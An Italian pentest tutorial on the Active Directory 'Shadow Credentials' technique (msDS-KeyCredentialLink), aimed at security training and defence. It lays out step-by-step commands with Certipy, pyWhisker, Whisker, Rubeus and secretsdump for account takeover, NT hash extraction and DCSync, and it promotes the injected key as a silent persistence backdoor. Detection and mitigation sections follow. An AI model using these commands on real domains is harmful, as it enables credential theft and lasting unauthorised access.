---
title: 'Shadow Credentials AD: PrivEsc msDS-KeyCredentialLink'
slug: shadow-credentials
description: 'Shadow Credentials: sfrutta msDS-KeyCredentialLink per il takeover di account AD senza password. Guida pratica con Whisker, pyWhisker e Certipy per pentest AD.'
image: /shadow-credentials-active-directory.webp
draft: false
date: 2026-07-12T00:00:00.000Z
categories:
  - windows
subcategories:
  - privilege-escalation
tags:
  - msds-keycredentiallink
  - shadow-credentials
  - certipy
---

# Shadow Credentials: Account Takeover Senza Toccare la Password

Hai `GenericWrite` o `GenericAll` su un account AD (utente o computer). Con Shadow Credentials aggiungi una tua chiave pubblica al suo attributo `msDS-KeyCredentialLink`, ti autentichi via PKINIT e ottieni TGT + NT hash dell'account — senza toccare la password, senza SPN. Tecnica MITRE ATT\&CK [T1556.006](https://attack.mitre.org/techniques/T1556/006/).

![Shadow Credentials attack flow: GenericWrite su msDS-KeyCredentialLink, aggiunta chiave, PKINIT auth, estrazione NT hash, Pass-the-Hash o DCSync](data:image/svg+xml;base64,PHN2ZyB2aWV3Qm94PSIwIDAgOTAwIDI2MCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3Qgd2lkdGg9IjkwMCIgaGVpZ2h0PSIyNjAiIGZpbGw9IiNmZmZmZmYiLz4KPHN0eWxlPgouYm94e2ZpbGw6IzExMTExMTtzdHJva2U6IzExMTExMTt9Ci5ib3hyZWR7ZmlsbDojZGMyNjI2O3N0cm9rZTojZGMyNjI2O30KLnR7Zm9udC1mYW1pbHk6bW9ub3NwYWNlO2ZvbnQtc2l6ZToxNHB4O2ZpbGw6I2ZmZmZmZjt0ZXh0LWFuY2hvcjptaWRkbGU7fQoubGJse2ZvbnQtZmFtaWx5Om1vbm9zcGFjZTtmb250LXNpemU6MTJweDtmaWxsOiMxMTExMTE7dGV4dC1hbmNob3I6bWlkZGxlO30KLmFycm93e3N0cm9rZTojMTExMTExO3N0cm9rZS13aWR0aDoyO21hcmtlci1lbmQ6dXJsKCNhcnJvdyk7fQo8L3N0eWxlPgo8ZGVmcz4KPG1hcmtlciBpZD0iYXJyb3ciIG1hcmtlcldpZHRoPSIxMCIgbWFya2VySGVpZ2h0PSIxMCIgcmVmWD0iOCIgcmVmWT0iMyIgb3JpZW50PSJhdXRvIiBtYXJrZXJVbml0cz0ic3Ryb2tlV2lkdGgiPgo8cGF0aCBkPSJNMCwwIEwwLDYgTDksMyB6IiBmaWxsPSIjMTExMTExIi8+CjwvbWFya2VyPgo8L2RlZnM+Cgo8cmVjdCB4PSIyMCIgeT0iNDAiIHdpZHRoPSIxNjAiIGhlaWdodD0iNTAiIHJ4PSI0IiBjbGFzcz0iYm94Ii8+Cjx0ZXh0IHg9IjEwMCIgeT0iNzAiIGNsYXNzPSJ0Ij5HZW5lcmljV3JpdGU8L3RleHQ+Cgo8cmVjdCB4PSIyMjAiIHk9IjQwIiB3aWR0aD0iMjAwIiBoZWlnaHQ9IjUwIiByeD0iNCIgY2xhc3M9ImJveHJlZCIvPgo8dGV4dCB4PSIzMjAiIHk9IjYwIiBjbGFzcz0idCI+QWRkIGtleSBjcmVkZW50aWFsPC90ZXh0Pgo8dGV4dCB4PSIzMjAiIHk9Ijc4IiBjbGFzcz0idCI+bXNEUy1LZXlDcmVkZW50aWFsTGluazwvdGV4dD4KCjxyZWN0IHg9IjQ2MCIgeT0iNDAiIHdpZHRoPSIxODAiIGhlaWdodD0iNTAiIHJ4PSI0IiBjbGFzcz0iYm94Ii8+Cjx0ZXh0IHg9IjU1MCIgeT0iNjAiIGNsYXNzPSJ0Ij5QS0lOSVQgYXV0aDwvdGV4dD4KPHRleHQgeD0iNTUwIiB5PSI3OCIgY2xhc3M9InQiPlRHVCArIE5UIGhhc2g8L3RleHQ+Cgo8cmVjdCB4PSI2ODAiIHk9IjQwIiB3aWR0aD0iMTgwIiBoZWlnaHQ9IjUwIiByeD0iNCIgY2xhc3M9ImJveHJlZCIvPgo8dGV4dCB4PSI3NzAiIHk9IjYwIiBjbGFzcz0idCI+UGFzcy10aGUtSGFzaDwvdGV4dD4KPHRleHQgeD0iNzcwIiB5PSI3OCIgY2xhc3M9InQiPi8gRENTeW5jPC90ZXh0PgoKPGxpbmUgeDE9IjE4MCIgeTE9IjY1IiB4Mj0iMjE1IiB5Mj0iNjUiIGNsYXNzPSJhcnJvdyIvPgo8bGluZSB4MT0iNDIwIiB5MT0iNjUiIHgyPSI0NTUiIHkyPSI2NSIgY2xhc3M9ImFycm93Ii8+CjxsaW5lIHgxPSI2NDAiIHkxPSI2NSIgeDI9IjY3NSIgeTI9IjY1IiBjbGFzcz0iYXJyb3ciLz4KCjx0ZXh0IHg9IjQ1MCIgeT0iMTQwIiBjbGFzcz0ibGJsIj5OZXNzdW5hIG1vZGlmaWNhIHBhc3N3b3JkIMK3IG5lc3N1biBTUE4gcmVnaXN0cmF0byDCtyBhdHRyaWJ1dG8gcmlwcmlzdGluYWJpbGU8L3RleHQ+Cgo8cmVjdCB4PSIyMCIgeT0iMTcwIiB3aWR0aD0iODYwIiBoZWlnaHQ9IjYwIiByeD0iNCIgZmlsbD0ibm9uZSIgc3Ryb2tlPSIjZGMyNjI2IiBzdHJva2Utd2lkdGg9IjIiLz4KPHRleHQgeD0iNDUwIiB5PSIxOTUiIGNsYXNzPSJsYmwiIGZpbGw9IiNkYzI2MjYiPkRldGVjdGlvbjogRXZlbnQgSUQgNTEzNiAoRGlyZWN0b3J5IFNlcnZpY2UgQ2hhbmdlcyk8L3RleHQ+Cjx0ZXh0IHg9IjQ1MCIgeT0iMjE1IiBjbGFzcz0ibGJsIj5yaWNoaWVkZSBhdWRpdGluZyBlc3BsaWNpdG8sIHNwZXNzbyBub24gYXR0aXZvIG5lZ2xpIGFtYmllbnRpIGVudGVycHJpc2U8L3RleHQ+Cjwvc3ZnPgo=)

## Come Trovare i Target (Enumerazione ACL)

Prima di tutto devi sapere su quali oggetti hai `GenericWrite`/`GenericAll`/`WriteProperty`. Non dare per scontato di saperlo già:

```bash
# BloodHound — query Cypher diretta su Neo4j
MATCH p=(n)-[:AddKeyCredentialLink|GenericWrite|GenericAll]->(m) RETURN p
```

```powershell
# PowerView
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object { $_.ActiveDirectoryRights -match "GenericWrite|GenericAll|WriteProperty" }
Get-ObjectAcl -SamAccountName targetUser -ResolveGUIDs
```

Se preferisci partire da zero con la raccolta dati:

```bash
bloodhound-python -u attacker -p 'Password123!' -d corp.local -ns <DC_IP> -c All
```

Con l'output identifichi subito chi ha ACL abusabili — utenti o computer — e decidi il target migliore.

## Requisiti

Prima di partire, verifica questi tre punti — se manca anche uno, l'attacco non parte:

| Requisito                                           | Come verificarlo                                                                                                                                                          |
| --------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Write access su `msDS-KeyCredentialLink` del target | [BloodHound](https://hackita.it/articoli/bloodhound/) → edge `AddKeyCredentialLink`, ma anche `GenericAll`/`GenericWrite`/`WriteProperty` sul target abilitano la tecnica |
| DC Windows Server 2016+ con PKINIT                  | `certipy find` o verifica versione OS del DC                                                                                                                              |
| Domain Functional Level 2016+                       | `netdom query fsmo` o LDAP query su `msDS-Behavior-Version`                                                                                                               |

Se PKINIT non è disponibile la tecnica non funziona: valuta [RBCD](https://hackita.it/articoli/semachineaccountquota/) come alternativa.

## Quando Shadow Credentials NON Funziona

L'attacco fallisce se il KDC non supporta PKINIT, il DC non ha un certificato valido per Kerberos, o il dominio non usa Key Trust. Riconosci il problema dall'errore:

| Errore                                                  | Significato                                             |
| ------------------------------------------------------- | ------------------------------------------------------- |
| `INSUFF_ACCESS_RIGHTS` / `Object has no write property` | non hai write access sull'attributo — ACL insufficiente |
| `KDC_ERR_PADATA_TYPE_NOSUPP`                            | PKINIT non disponibile sul DC                           |
| `KDC_ERR_CLIENT_NOT_TRUSTED`                            | certificato o configurazione PKINIT non validi          |

Se vedi `KDC_ERR_PADATA_TYPE_NOSUPP`, fermati: la tecnica non è applicabile in quell'ambiente, passa a RBCD.

## Shadow Credentials vs RBCD

Si confondono spesso, ma risolvono problemi diversi:

|                         | Shadow Credentials | RBCD                              |
| ----------------------- | ------------------ | --------------------------------- |
| Richiede PKINIT         | Sì                 | No                                |
| Richiede SPN            | No                 | Sì                                |
| Serve creare un account | No                 | Spesso sì (MachineAccountQuota)   |
| Risultato               | NT hash del target | Impersonazione di servizi via S4U |

**Come decidere in pratica:**

* `GenericWrite` su un utente → Shadow Credentials, RBCD non si applica
* `GenericWrite` su un computer → valuta entrambe, Shadow Credentials è più diretta se ti serve solo l'hash
* PKINIT non disponibile → RBCD
* `MachineAccountQuota = 0` (niente nuovi computer account) → Shadow Credentials diventa l'opzione più comoda, perché non richiede di crearne uno

Prima verifica rapida dell'ambiente:

```bash
certipy find -u attacker@corp.local -p 'Password123!' -dc-ip <DC_IP> -vulnerable
```

Ti dice se c'è una CA, se PKINIT è disponibile e se ci sono altre vulnerabilità ADCS sfruttabili in parallelo.

## Step 1 — Enumera l'attributo attuale

Prima di scrivere qualsiasi cosa, salva lo stato esistente per poterlo ripristinare dopo:

```bash
certipy shadow list -u attacker@corp.local -p 'Password123!' -account targetUser -dc-ip <DC_IP>
```

Se il target ha già entry (WHfB reale, per esempio), non sovrascrivere: usa `add`, non `clear`.

## Step 2 — Aggiungi la Shadow Credential

**Opzione A — Certipy, un solo comando (add + auth + hash + restore):**

```bash
certipy shadow auto -u attacker@corp.local -p 'Password123!' -account targetUser -dc-ip <DC_IP>
```

Output atteso:

```
[*] Targeting user 'targetUser'
[*] Generating certificate
[*] Generating KeyCredential
[*] Adding KeyCredential to 'targetUser'
[*] Authenticating as 'targetUser' with the certificate
[*] Got hash for 'targetUser@corp.local': aad3b435b51404eeaad3b435b51404ee:<NT_HASH>
[*] Restored 'targetUser'
```

Fine. Hash in mano, attributo già ripristinato — non serve altro.

**Opzione B — pyWhisker, step separati (se vuoi controllo manuale su ogni fase):**

```bash
# Add
pywhisker -d corp.local -u attacker -p 'Password123!' --target targetUser --action add --dc-ip <DC_IP>

# Genera anche il .pfx da usare con Rubeus/Certipy
```

**Opzione C — Whisker da Windows:**

```powershell
Whisker.exe add /target:targetUser /domain:corp.local /dc:DC01.corp.local /path:C:\temp\targetUser.pfx /password:Passw0rd
```

## Step 3 — Autentica e ottieni l'hash (se hai usato Opzione B o C)

```bash
certipy auth -pfx targetUser.pfx -dc-ip <DC_IP> -username targetUser -domain corp.local
```

```powershell
Rubeus.exe asktgt /user:targetUser /certificate:targetUser.pfx /password:Passw0rd /domain:corp.local /dc:DC01.corp.local /getcredentials /show /ptt
```

## Step 4 — Usa l'hash

L'NT hash ottenuto è quello reale del target. Da qui:

* **Pass-the-Hash** verso qualsiasi servizio del dominio con quell'account
* Se il target era il computer account di un DC (`DC01$`) → [DCSync](https://hackita.it/articoli/dcsync/) diretto:

```bash
impacket-secretsdump -hashes :<NT_HASH> corp.local/'DC01$'@<DC_IP>
```

## Step 5 — Ripristina (se hai usato Opzione B o C)

Con Certipy `auto` è già automatico. Con pyWhisker/Whisker, rimuovi la entry aggiunta usando il DeviceID mostrato nell'output di `add`:

```bash
pywhisker -d corp.local -u attacker -p 'Password123!' --target targetUser --action remove --device-id <GUID> --dc-ip <DC_IP>
```

Con Certipy puoi fare lo stesso, oppure svuotare del tutto l'attributo (solo se sei sicuro non ci fossero entry legittime):

```bash
certipy shadow remove -u attacker@corp.local -p 'Password123!' -account targetUser -device-id <GUID> -dc-ip <DC_IP>
certipy shadow clear -u attacker@corp.local -p 'Password123!' -account targetUser -dc-ip <DC_IP>
```

**Attenzione:** se il target aveva già KeyCredential prima del tuo intervento (WHfB reale), usa solo `remove` con il DeviceID specifico — mai `clear`, che cancella tutte le entry e rompe l'autenticazione legittima dell'utente.

***

## Perché Funziona (in breve)

`msDS-KeyCredentialLink` esiste per Windows Hello for Business: ci si registra una chiave pubblica, e il KDC la accetta come prova d'identità in fase di pre-auth PKINIT al posto della password. Chi ha `GenericWrite`/`GenericAll`/`WriteProperty` su quell'attributo può iniettare la propria chiave e ottenere lo stesso trattamento — un TGT valido.

**Importante:** non è PKINIT a restituire direttamente l'NT hash. Il TGT ottenuto via PKINIT serve solo ad autenticarsi. L'hash viene recuperato in un secondo momento con una richiesta S4U2Self verso se stessi: nel PAC di quel Service Ticket è incluso un campo `NTLM_SUPPLEMENTAL_CREDENTIAL` cifrato, che Certipy/Rubeus decriptano per te con `-getcredentials`.

**Nota:** un oggetto utente non può scrivere il proprio `msDS-KeyCredentialLink`; un computer sì, ma solo se l'attributo è vuoto. I gruppi che normalmente ci scrivono sono Key Admins, Enterprise Key Admins, Domain Admins — e l'account di sync Entra Connect (`MSOL_*`), utile da sapere per non confondere l'attacco con rumore legittimo.

**Persistenza:** se non rimuovi il KeyCredential, resta utilizzabile finché qualcuno non modifica o svuota manualmente l'attributo — utile come backdoor silenziosa oltre che per l'estrazione one-shot dell'hash.

### Shadow Credentials come Tecnica di Persistenza

Non è solo privilege escalation: molti red team la usano proprio per mantenere accesso silenzioso a un account critico dopo l'engagement iniziale. A differenza di un reset password o della creazione di un nuovo account, la KeyCredential aggiunta non genera alert visibili se l'auditing 5136 non è attivo, e resta valida indefinitamente finché non viene rimossa esplicitamente.

**Computer account come target:** la tecnica funziona benissimo anche su oggetti macchina (`WEB01$`, `SQL01$`, `DC01$`), spesso obiettivi più redditizi degli utenti perché portano dritti a lateral movement o DCSync.

**ShadowSpray:** con `GenericWrite` diffuso su molti oggetti (scenario comune in ambienti con ACL delegate male), applicare la tecnica uno a uno è lento. ShadowSpray automatizza l'aggiunta della KeyCredential su più target in parallelo, invece di ripetere manualmente `certipy shadow add` per ognuno.

## Detection

* **Event ID 5136** — modifica a `msDS-KeyCredentialLink`. Richiede auditing "Directory Service Changes" attivo sui DC, spesso assente in ambienti enterprise
* **Event ID 4768** con pre-auth type `16` (PKINIT) per account che normalmente non usano WHfB o smart card

**Falsi positivi:** l'attributo cambia legittimamente durante enrollment WHfB reali e durante sync Entra Connect (`MSOL_*`). Il segnale da isolare è una modifica da un account **fuori** dai gruppi Key Admins/Enterprise Key Admins/Domain Admins.

Microsoft Defender for Identity ha detection nativa per questo pattern.

## Mitigazione

* Abilitare "Directory Service Changes" auditing su tutti i DC (Event ID 5136)
* Rivedere con BloodHound chi ha `GenericWrite`/`AddKeyCredentialLink` e tagliare l'accesso non necessario
* Monitorare PKINIT (Event ID 4768 type 16) da account senza storico WHfB
* Se WHfB non è in uso, valutare la disabilitazione di Key Trust Account Mapping sul DC

## FAQ

**Modifica la password del target?**
No, solo aggiunge una chiave pubblica. L'account continua a funzionare normalmente.

**Serve AD CS nel dominio?**
Non è un requisito della tecnica in sé, ma serve un certificato di Server Authentication sul DC per PKINIT — condizione quasi sempre vera se AD CS è già in foresta.

**Un utente può ripulire da solo il proprio attributo?**
No, un oggetto utente non può scrivere il proprio `msDS-KeyCredentialLink`. Il ripristino va fatto dall'account con cui hai eseguito l'attacco.

***

**Risorse:** [MITRE ATT\&CK T1556.006](https://attack.mitre.org/techniques/T1556/006/) · [Elad Shamir — SpecterOps](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab) · [The Hacker Recipes](https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials) · [HackTricks](https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/acl-persistence-abuse/shadow-credentials.html) · [ired.team](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/shadow-credentials) · [HackingArticles](https://www.hackingarticles.in/shadow-credentials-attack/)
